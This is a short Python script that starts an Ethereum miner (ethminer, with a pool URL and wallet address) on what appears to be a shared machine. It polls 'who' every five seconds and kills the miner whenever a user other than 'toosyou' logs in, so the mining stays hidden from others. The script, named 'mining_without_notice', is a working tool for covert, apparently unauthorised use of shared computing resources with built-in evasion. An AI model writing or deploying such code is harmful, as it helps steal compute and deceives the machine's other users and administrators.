import os
import signal
import time
import threading
import schedule
import subprocess

mining_is_on = False
miner_process = None

def mining_without_notice():
    global mining_is_on
    global miner_process

    threading.Timer(5, mining_without_notice).start()
    someone_else_detected = False
    who_read = os.popen('who').read()
    who_read = who_read.splitlines()
    for line in who_read:
        if not line.startswith('toosyou') and (not 'tmux' in line):
            print('Someone else logins!')
            someone_else_detected = True
            if mining_is_on:
                # kill the miner
                miner_process.kill()
                mining_is_on = False

    # open miner
    if someone_else_detected == False and mining_is_on == False:
        print('Open miner!')
        miner_process = subprocess.Popen(['/usr/bin/ethminer', '-G', '-F', 'http://ethereumpool.co/?miner=46@0x77209304F249d46DFA6Af187451A32bFeFd219e1@mip1070'], env=os.environ)
        print('pid =', miner_process.pid)
        mining_is_on = True

if __name__ == '__main__':
    mining_without_notice()
